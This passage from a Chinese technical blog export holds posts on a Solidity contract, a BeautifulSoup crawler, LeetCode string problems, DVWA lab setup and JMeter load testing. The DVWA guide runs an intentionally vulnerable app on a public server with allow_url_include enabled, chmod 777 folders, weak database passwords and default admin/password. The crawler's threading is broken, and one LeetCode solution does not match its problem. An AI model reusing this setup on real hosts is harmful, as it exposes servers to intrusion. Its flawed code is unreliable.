<h2 id="其他实例"><a href="#其他实例" class="headerlink" title="其他实例"></a>其他实例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// pragma solidity ^0.6.3;</span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract TestStruct &#123;</span><br><span class="line"></span><br><span class="line">      struct User &#123;</span><br><span class="line">          string name; // 对应的是item_id</span><br><span class="line">          string user_name;</span><br><span class="line">          string issue_date;</span><br><span class="line">          string  start_date;</span><br><span class="line">          string  end_date;</span><br><span class="line">     &#125;</span><br><span class="line">	 </span><br><span class="line">	 event onadd(string newname);</span><br><span class="line">	 event onadduser(string newname,User u);</span><br><span class="line">	 event onaddusers(uint256 len,User[] u);</span><br><span class="line"></span><br><span class="line">    mapping (string =&gt; User) users;</span><br><span class="line">	</span><br><span class="line">	  constructor() public</span><br><span class="line">    &#123;</span><br><span class="line">//		User memory u = User(&quot;alice&quot;,10001, &quot;2012-12-01&quot;, &quot;start&quot;);</span><br><span class="line">		User memory u = User(&quot;100001&quot;,&quot;lisa&quot;, &quot;2012-12-01&quot;, &quot;start&quot;, &quot;end&quot;);</span><br><span class="line">		addUser(u);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     function addUser (User memory _user) public &#123;</span><br><span class="line"></span><br><span class="line">           addbyname(_user.name,_user);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	function addbyname (string memory name,User memory _user) public &#123;</span><br><span class="line"></span><br><span class="line">       users[name] = _user;</span><br><span class="line">		emit onadd(name);</span><br><span class="line">		emit onadduser(name,_user);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addUsers (User [] memory _users) public &#123;</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; _users.length; i++) &#123;</span><br><span class="line">           //users[_users[i].name] = _users[i];</span><br><span class="line">			addUser(_users[i]);</span><br><span class="line">        &#125;</span><br><span class="line">		emit onaddusers(_users.length,_users);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getUser (string memory username) public view returns (User memory) &#123;</span><br><span class="line"></span><br><span class="line">        //bytes32 hash = keccak256(abi.encode(username));</span><br><span class="line">        return users[username];</span><br><span class="line">    &#125;</span><br><span class="line">    event on_putbytes(string n,bytes32 b);</span><br><span class="line">    function putbytes(string memory uname,bytes32 br) public</span><br><span class="line">    &#123;</span><br><span class="line">        emit on_putbytes(uname,br);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>区块链</tag>
        <tag>fisco-bcos</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程爬虫-BeautifulSoup</title>
    <url>/aposts/32ab6d91/</url>
    <content><![CDATA[<h3 id="线程基类"><a href="#线程基类" class="headerlink" title="线程基类"></a>线程基类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">class base_thread(threading.Thread):</span><br><span class="line">    def __init__(self, func):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.func = func</span><br><span class="line">        #print(type(self.func))</span><br><span class="line">    def run(self):</span><br><span class="line">        self.func</span><br></pre></td></tr></table></figure>


<h3 id="爬虫百度贴吧中某帖子图片"><a href="#爬虫百度贴吧中某帖子图片" class="headerlink" title="爬虫百度贴吧中某帖子图片"></a>爬虫百度贴吧中某帖子图片</h3><ul>
<li>先要安装BeautifulSoup</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.request as request</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from Base.Threads import base_thread</span><br><span class="line">path = &#x27;e:/apps/pic/&#x27;</span><br><span class="line">def CrawlerFunc(url):</span><br><span class="line">    list_img = getUrl(url)</span><br><span class="line">    multi_thread(len(list_img), downloadImg(list_img))</span><br><span class="line">def getUrl(url):</span><br><span class="line">    response = request.urlopen(url)</span><br><span class="line">    html = response.read()</span><br><span class="line">    data = html.decode(&#x27;utf-8&#x27;)</span><br><span class="line">    soup = BeautifulSoup(data)</span><br><span class="line">    list_img = []</span><br><span class="line">    for list in soup.find_all(&quot;img&quot;, &#123;&quot;class&quot;, &quot;BDE_Image&quot;&#125;):</span><br><span class="line">        list_img.append(list.attrs[&quot;src&quot;])</span><br><span class="line">    return list_img</span><br><span class="line"></span><br><span class="line">def downloadImg(list_img):</span><br><span class="line">    count = 1</span><br><span class="line">    for i in list_img:</span><br><span class="line">        filepath = path + str(count)+&quot;.jpg&quot;</span><br><span class="line">        with open(filepath, &#x27;wb&#x27;) as file:</span><br><span class="line">            print(filepath)</span><br><span class="line">            image_data = request.urlopen(i).read()</span><br><span class="line">            file.write(image_data)</span><br><span class="line">        count += 1</span><br><span class="line">def multi_thread(count, func):</span><br><span class="line">    threads = []</span><br><span class="line">    for i in range(0, count):</span><br><span class="line">        threads.append(base_thread(func))</span><br><span class="line">    for j in range(0, count):</span><br><span class="line">        threads[j].start()</span><br><span class="line">    for k in range(0, count):</span><br><span class="line">        threads[k].join()</span><br><span class="line">#CrawlerFunc(&quot;http://tieba.baidu.com/p/3764230390&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/#css-selectors">BeautifulSoup官网api</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串的算法总结</title>
    <url>/aposts/d002f55e/</url>
    <content><![CDATA[<h2 id="验证回文串"><a href="#验证回文串" class="headerlink" title="验证回文串"></a>验证回文串</h2><ul>
<li>给定一个字符串，验证它是否是回文串，只考虑字母和数字字符，可以忽略字母的大小写。</li>
<li>说明：本题中，我们将空字符串定义为有效的回文串。</li>
<li>本题来自<a href="https://leetcode-cn.com/problems/valid-palindrome/">这里</a></li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def isPalindrome(self, s: str) -&gt; bool:</span><br><span class="line">    	# 字符串转为小写</span><br><span class="line">        new_str = s.lower()</span><br><span class="line">        new_list = list()</span><br><span class="line">        for i in new_str:</span><br><span class="line">         # 过滤数字</span><br><span class="line">            if i.isalnum():</span><br><span class="line">                new_list.append(i)</span><br><span class="line">        # 字符串转换为list，顺序和逆序进行对比</span><br><span class="line">        return (new_list[::1] == new_list[::-1])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><ul>
<li>给定一个字符串数组，将其反转</li>
</ul>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><ul>
<li>第一种：使用字符串切片</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;aaacccsss&#x27;</span><br><span class="line">result = s[::-1]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<ul>
<li>第二种：使用列表的reverse方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;aaacccsss&#x27;</span><br><span class="line">l = list(s)</span><br><span class="line">l.reverse()</span><br><span class="line">result = &quot;&quot;.join(l)</span><br></pre></td></tr></table></figure>

<ul>
<li>第三种：使用栈</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func(s):</span><br><span class="line">    l = list(s) #模拟全部入栈</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    while len(l)&gt;0:</span><br><span class="line">        result += l.pop() #模拟出栈</span><br><span class="line">    return result</span><br><span class="line">result = func(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反转字符串中的单词-III"><a href="#反转字符串中的单词-III" class="headerlink" title="反转字符串中的单词 III"></a>反转字符串中的单词 III</h2><ul>
<li>给定一个字符串 s，将字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。</li>
<li>题目来自<a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">这里</a></li>
</ul>
<p><strong>示例1:</strong></p>
<p>输入: “the sky is blue”<br>输出: “blue is sky the”</p>
<p><strong>示例2:</strong></p>
<p>输入: “ hello world! “<br>输出: “world! hello”<br>解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。</p>
<p><strong>示例3:</strong></p>
<p>输入: “a good example”<br>输出: “example good a”<br>解释: 如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为 Python 的字符串是不可变的，所以在原字符串空间上进行切换顺序操作肯定是不可行的了。但我们可以利用切片方法。</p>
<ul>
<li>将字符串按空格进行分割，分割成一个个的单词。</li>
<li>再将每个单词进行反转。</li>
<li>然后再将每个单词连接起来。</li>
</ul>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def reverseWords(self, s: str) -&gt; str:</span><br><span class="line">        return &quot; &quot;.join(s.strip().split()[::-1])</span><br><span class="line">        # return &quot; &quot;.join([t for t in s.strip().split()][::-1])</span><br><span class="line"></span><br><span class="line">    def reverseWords1(self, s: str) -&gt; str:</span><br><span class="line">       # 将字符串按空格进行分割，分割成一个个的单词列表,去掉了首位两端的空格</span><br><span class="line">        s1 = s.strip().split()</span><br><span class="line">        # 反转单单词列表</span><br><span class="line">        s2 = s1[::-1]</span><br><span class="line">        # 单词列表转换为字符连接起来</span><br><span class="line">        s3 = &quot; &quot;.join(s2)</span><br><span class="line">        return s3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = Solution().reverseWords(&quot;the sky is blue&quot;)</span><br><span class="line">print(resp)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>安全测试-搭建漏洞环境</title>
    <url>/aposts/97835086/</url>
    <content><![CDATA[<h1 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h1><p>DVWA（Damn Vulnerable Web App）是一个基于PHP&#x2F;MySql搭建的Web应用程序，旨在为安全专业人员测试自己的专业技能和工具提供合法的 环境，帮助Web开发者更好的理解Web应用安全防范的过程。DVWA一共包含十个模块分别是：</p>
<ul>
<li><p>Bruce Force &#x2F;&#x2F;暴力破解</p>
</li>
<li><p>Command Injection &#x2F;&#x2F;命令注入</p>
</li>
<li><p>CSRF &#x2F;&#x2F;跨站请求伪造</p>
</li>
<li><p>File Inclusion &#x2F;&#x2F;文件包含</p>
</li>
<li><p>File Upload &#x2F;&#x2F;文件上传漏洞</p>
</li>
<li><p>Insecure CAPTCHA &#x2F;&#x2F;不安全的验证</p>
</li>
<li><p>SQL Injection &#x2F;&#x2F;sql注入</p>
</li>
<li><p>SQL Injection（Blind） &#x2F;&#x2F;sql注入（盲注）</p>
</li>
<li><p>XSS（Reflected） &#x2F;&#x2F;反射型XSS</p>
</li>
<li><p>XSS（Stored） &#x2F;&#x2F;存储型XSS</p>
</li>
</ul>
<p>同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。</p>
<h1 id="DVWA的搭建"><a href="#DVWA的搭建" class="headerlink" title="DVWA的搭建"></a>DVWA的搭建</h1><ul>
<li>DVWA是由PHP代码开发的，可以采用更简单的搭建方式，就是用<a href="https://sourceforge.net/projects/xampp/">xampp</a></li>
<li>我本次搭建到腾讯云服务器上，采用手动安装服务的方式，并不安装mariadb和mariadb-server，因为我服务器已经安装了mysql</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install php php-mysql php-gd  httpd -y</span><br></pre></td></tr></table></figure>

<ul>
<li>下载最新的DVWA并解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos local]# wget https://codeload.github.com/digininja/DVWA/zip/refs/tags/2.0.1</span><br><span class="line">[root@VM-24-13-centos local]# unzip 2.0.1 -d  dvwa</span><br><span class="line">[root@VM-24-13-centos local]# cd  dvwa</span><br><span class="line">[root@VM-24-13-centos dvwa]# ll</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 10 root root 4096 Sep  1  2020 DVWA-2.0.1</span><br><span class="line">[root@VM-24-13-centos dvwa]# cd DVWA-2.0.1/</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# ll</span><br><span class="line">total 148</span><br><span class="line">-rw-r--r--  1 root root  3415 Sep  1  2020 about.php</span><br><span class="line">-rw-r--r--  1 root root  7296 Sep  1  2020 CHANGELOG.md</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 config</span><br><span class="line">-rw-r--r--  1 root root 33107 Sep  1  2020 COPYING.txt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 docs</span><br><span class="line">drwxr-xr-x  6 root root  4096 Sep  1  2020 dvwa</span><br><span class="line">drwxr-xr-x  4 root root  4096 Sep  1  2020 external</span><br><span class="line">-rw-r--r--  1 root root  1406 Sep  1  2020 favicon.ico</span><br><span class="line">drwxr-xr-x  5 root root  4096 Sep  1  2020 hackable</span><br><span class="line">-rw-r--r--  1 root root   895 Sep  1  2020 ids_log.php</span><br><span class="line">-rw-r--r--  1 root root  4393 Sep  1  2020 index.php</span><br><span class="line">-rw-r--r--  1 root root  1869 Sep  1  2020 instructions.php</span><br><span class="line">-rw-r--r--  1 root root  4183 Sep  1  2020 login.php</span><br><span class="line">-rw-r--r--  1 root root   414 Sep  1  2020 logout.php</span><br><span class="line">-rw-r--r--  1 root root   199 Sep  1  2020 phpinfo.php</span><br><span class="line">-rw-r--r--  1 root root   154 Sep  1  2020 php.ini</span><br><span class="line">-rw-r--r--  1 root root 15490 Sep  1  2020 README.md</span><br><span class="line">-rw-r--r--  1 root root    26 Sep  1  2020 robots.txt</span><br><span class="line">-rw-r--r--  1 root root  4724 Sep  1  2020 security.php</span><br><span class="line">-rw-r--r--  1 root root  3063 Sep  1  2020 setup.php</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 tests</span><br><span class="line">drwxr-xr-x 16 root root  4096 Sep  1  2020 vulnerabilities</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>开启服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start  httpd </span><br></pre></td></tr></table></figure>

<ul>
<li>移动到apache根目录下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos dvwa]# cp -r DVWA-2.0.1/ /var/www/html/</span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos config]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/config</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos config]# cp config.inc.php.dist config.inc.php</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos config]#  vi config.inc.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DVWA = array();</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_server&#x27;</span> ]   = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_database&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;dvwa&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;dvwa1234&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_port &#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;XXXXXAAAKPoVVMvbWSGeo4rm0D-Ev5TKSTr&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;XXXXAJfPh10KQCdJZizM0yfmQTHQjA3y&#x27;</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>recaptcha_public_key和recaptcha_private_key 的生成</li>
<li>打开<a href="https://www.google.com/recaptcha/admin%E8%BF%9B%E8%A1%8C%E5%88%9B%E5%BB%BA">https://www.google.com/recaptcha/admin进行创建</a></li>
</ul>
<p><img src="/aposts/97835086/image-20220126100635195.png" alt="image-20220126100635195"></p>
<p><img src="/aposts/97835086/image-20220126100827029.png" alt="image-20220126100827029"></p>
<ul>
<li>创建数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos config]# mysql -u root -p</span><br><span class="line">mysql&gt; create database dvwa;</span><br><span class="line">mysql&gt;use dvwa;</span><br><span class="line">mysql&gt; set global validate_password.policy=&#x27;LOW&#x27;; # mysql8后，有密码策略要求，改为低</span><br><span class="line">mysql &gt;create user &#x27;dvwa&#x27;@&#x27;%&#x27; identified by &#x27;dvwa1234&#x27;; # 创建用户和密码</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt; select host, user, authentication_string, plugin from user;</span><br><span class="line">+-----------+------------------+------------------------------------------------------------------------+-----------------------+</span><br><span class="line">| host      | user             | authentication_string                                                  | plugin                |</span><br><span class="line">+-----------+------------------+------------------------------------------------------------------------+-----------------------+</span><br><span class="line">X3%         | dvwa             | $A$005$6?yx</span><br><span class="line"></span><br><span class="line">mysql&gt;use dvwa;</span><br><span class="line">mysql&gt; grant all privileges on dvwa.* to &#x27;dvwa&#x27;@&#x27;%&#x27;; # 授权数据库给用户</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">mysql&gt;exit;</span><br><span class="line"></span><br><span class="line"># 登录成功</span><br><span class="line">mysql -u dvwa -p</span><br></pre></td></tr></table></figure>

<ul>
<li>80端口腾讯云在规则中已经默认打开，设置下防火墙</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启防火墙</span><br><span class="line">systemctl start firewalld</span><br><span class="line"># 防火墙打开80端口</span><br><span class="line">[root@VM-24-13-centos config]# firewall-cmd --zone=public --add-port=80/tcp --permane</span><br><span class="line"># 重启httpd服务</span><br><span class="line">service httpd restart</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>用外网ip打开安装目录</li>
</ul>
<p><img src="/aposts/97835086/image-20220126150340578.png" alt="image-20220126150340578"></p>
<ul>
<li>出现一些红色错误，一个个来解决</li>
</ul>
<p><img src="/aposts/97835086/image-20220126151224710.png" alt="image-20220126151224710"></p>
<ul>
<li>设置php.ini</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/php.ini</span><br><span class="line"></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>

<ul>
<li>设置权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos hackable]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/hackable</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos hackable]# chmod 777 uploads</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# chmod 777 external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# chmod 7777 config/</span><br><span class="line"># 重启httpd服务</span><br><span class="line">service httpd restart</span><br></pre></td></tr></table></figure>

<ul>
<li>出现加密的插件不存在</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">set global validate_password.policy=&#x27;LOW&#x27;</span><br><span class="line">ALTER USER &#x27;dvwa&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;dvwa1234&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<ul>
<li>再次打开页面，就可以了，点击登录，用户名和密码为：admin&#x2F;password</li>
</ul>
<p><img src="/aposts/97835086/image-20220126152915786.png" alt="image-20220126152915786"></p>
<p><img src="/aposts/97835086/image-20220126153115113.png" alt="image-20220126153115113"></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>寻找拐点</title>
    <url>/aposts/66ac71c6/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>jmeter 5.4.1</li>
<li>测试论坛登录并发的拐点</li>
</ul>
<h2 id="第一次线程组脚本配置"><a href="#第一次线程组脚本配置" class="headerlink" title="第一次线程组脚本配置"></a>第一次线程组脚本配置</h2><ul>
<li><p>设置并发10个请求，永远</p>
<p><img src="/aposts/66ac71c6/image-20211126145852042.png" alt="image-20211126145852042"></p>
</li>
<li><p>设置RPS定时器，将RPS逐渐增加到50&#x2F;S，并持续一段时间</p>
</li>
</ul>
<p><img src="/aposts/66ac71c6/image-20211126150023226.png" alt="image-20211126150023226"></p>
<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><ul>
<li><p>首先分析Hits per Second，在54秒后，RPS为84.7&#x2F;S（可以理解为：<strong>最大支持1秒内84.7个用户同时登录</strong>），<strong>出现拐点</strong>，请求曲线开始收窄，有同学会问，怎么会是RPS？不是HPS吗？因为在单接口请求下，我么可以认为HPS和RPS是相等的</p>
<p><img src="/aposts/66ac71c6/image-20211129113816875.png" alt="image-20211129113816875"></p>
</li>
<li><p>查看聚合报告，得到RT的响应时间，平均值为203，，这时候可能会有同学说，你这里不能取平均时间，不具有代表性，我们还应该考虑90%,95%，99%不同比例的接口响应时间。对的，个人认为，这些数值在和平均值没有过大的区别的情况下，我们可以取平均值来计算，如果说出现了较大的波动，那么我们需要考虑是不是服务器的内存,cpu出现了问题。</p>
</li>
<li><p>这里我们算下并发数：<code>84.7*0.203=17.19</code>，可以理解为，<strong>支持17.19个用户在1s内同时登录</strong></p>
</li>
<li><p>查看TPS ，发现在16秒支持<strong>最大tps为12</strong>，不然就会出现明显波动</p>
<p><img src="/aposts/66ac71c6/image-20211129114833158.png" alt="image-20211129114833158"></p>
</li>
</ul>
<h3 id="第一次运行结果总结"><a href="#第一次运行结果总结" class="headerlink" title="第一次运行结果总结"></a>第一次运行结果总结</h3><ul>
<li>我们的<strong>最大请求数为84</strong></li>
<li><strong>最大 TPS 为12</strong></li>
<li><strong>最大系统并发数在 17左右</strong></li>
<li>超出这些范围就开始出现波动</li>
</ul>
<h2 id="第二次调整运行参数"><a href="#第二次调整运行参数" class="headerlink" title="第二次调整运行参数"></a>第二次调整运行参数</h2><ul>
<li><p>并发数调整为<strong>5个</strong></p>
<p><img src="/aposts/66ac71c6/image-20211129145513074.png" alt="image-20211129145513074"></p>
<h3 id="运行结果分析"><a href="#运行结果分析" class="headerlink" title="运行结果分析"></a>运行结果分析</h3></li>
<li><p>在54秒时，RPS的值为<strong>84.3&#x2F;S</strong></p>
<p><img src="/aposts/66ac71c6/image-20211129145631570.png" alt="image-20211129145631570"></p>
</li>
<li><p>查看聚合报告，得到RT的响应时间，平均值为175，这里我们算下<strong>并发数：84.3*0.175&#x3D;14.17</strong></p>
</li>
</ul>
<p><img src="/aposts/66ac71c6/image-20211129145944164.png" alt="image-20211129145944164"></p>
<ul>
<li>查看TPS，在21秒是，<strong>tps的值为18</strong>为最佳，不然后续出现巨大波动</li>
</ul>
<p><img src="/aposts/66ac71c6/image-20211129150633788.png" alt="image-20211129150633788"></p>
<h3 id="第二次结果分析"><a href="#第二次结果分析" class="headerlink" title="第二次结果分析"></a>第二次结果分析</h3><ul>
<li>我们的<strong>最大请求数为84</strong></li>
<li><strong>最大 TPS 为18</strong></li>
<li><strong>最大系统并发数在 14左右</strong></li>
<li>超出这些范围就开始出现波动</li>
</ul>
<h2 id="CLI运行"><a href="#CLI运行" class="headerlink" title="CLI运行"></a>CLI运行</h2><ul>
<li>10个并发</li>
</ul>
<h3 id="命令运行"><a href="#命令运行" class="headerlink" title="命令运行"></a>命令运行</h3><ul>
<li>发起压测请求<code>jmeter -n -t resp.jmx -l result/report.jtl</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E:\jmeter&gt;jmeter -n -t resp.jmx -l result/report.jtl</span><br><span class="line">Creating summariser &lt;summary&gt;</span><br><span class="line">Created the tree successfully using resp.jmx</span><br><span class="line">Starting standalone <span class="built_in">test</span> @ Tue Nov 30 10:06:56 CST 2021 (1638238016471)</span><br><span class="line">Waiting <span class="keyword">for</span> possible Shutdown/StopTestNow/HeapDump/ThreadDump message on port 4445</span><br><span class="line">summary +      9 <span class="keyword">in</span> 00:00:03 =    2.6/s Avg:   140 Min:   117 Max:   230 Err:     0 (0.00%) Active: 5 Started: 5 Finished: 0</span><br><span class="line">summary +    406 <span class="keyword">in</span> 00:00:30 =   13.7/s Avg:   148 Min:   108 Max:  1160 Err:     0 (0.00%) Active: 5 Started: 5 Finished: 0</span><br><span class="line">summary =    415 <span class="keyword">in</span> 00:00:33 =   12.5/s Avg:   148 Min:   108 Max:  1160 Err:     0 (0.00%)</span><br><span class="line">summary +    516 <span class="keyword">in</span> 00:00:30 =   17.2/s Avg:   232 Min:   108 Max: 15728 Err:     0 (0.00%) Active: 5 Started: 5 Finished: 0</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<ul>
<li><p>压测完毕后，转变为测试报告</p>
<p><code>jmeter -g report.jtl -o report</code></p>
<p><img src="/aposts/66ac71c6/image-20211130102551759.png" alt="image-20211130102551759"></p>
<h3 id="报告分析"><a href="#报告分析" class="headerlink" title="报告分析"></a>报告分析</h3></li>
<li><p>RPS为<strong>80.48&#x2F;S</strong></p>
<p><img src="/aposts/66ac71c6/image-20211130102819087.png" alt="image-20211130102819087"></p>
</li>
<li><p>得到RT的响应时间，平均值为121.14，这里我们算下<strong>并发数：80.4*0.121&#x3D;14.17</strong></p>
</li>
</ul>
<p><img src="/aposts/66ac71c6/image-20211130103151709.png" alt="image-20211130103151709"></p>
<ul>
<li><p><strong>tps的值为27</strong>为最佳，不然后续出现巨大波动</p>
<p><img src="/aposts/66ac71c6/image-20211130104030732.png" alt="image-20211130104030732"></p>
</li>
</ul>
<h3 id="第三次结果分析"><a href="#第三次结果分析" class="headerlink" title="第三次结果分析"></a>第三次结果分析</h3><ul>
<li>我们的<strong>最大请求数为84</strong></li>
<li><strong>最大 TPS 为27</strong></li>
<li><strong>最大系统并发数在 14左右</strong></li>
<li>超出这些范围就开始出现波动</li>
</ul>
<h2 id="三次结果总结"><a href="#三次结果总结" class="headerlink" title="三次结果总结"></a>三次结果总结</h2><ul>
<li>我们的<strong>最大请求数为84</strong></li>
<li><strong>最大 TPS 为12-27</strong><ul>
<li>CLI模式下TPS支持最大</li>
</ul>
</li>
<li><strong>最大系统并发数在 14-17</strong></li>
<li>这些范围就开始出现波动</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>可以测试多次，取平均值</li>
<li><a href="https://blog.csdn.net/limenglovechen/article/details/107685933">参考这里</a>的测试方式</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>性能测试需求分析和目标确定</title>
    <url>/aposts/da937c73/</url>
    <content><![CDATA[<h2 id="需求采集"><a href="#需求采集" class="headerlink" title="需求采集"></a>需求采集</h2><ul>
<li><p>下面以JForum 论坛为例进行需求采集，首先要了解系统物理架构与逻辑架构。</p>
</li>
<li><p>物理架构：指导进行测试环境建立，测试环境与生产环境的架构趋于一致。</p>
</li>
<li><p>逻辑架构：让我们对系统的逻辑组成有所了解，进行测试时能够清楚地划分问题出现地区域。</p>
</li>
</ul>
<h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p><img src="/aposts/da937c73/image-20211019170600141.png" alt="image-20211019170600141"></p>
<ul>
<li><p>WebServer 负责反向代理，静态请求处理；Tomcat7 负载动态请求处理；Mysql5.6 做双击热备</p>
</li>
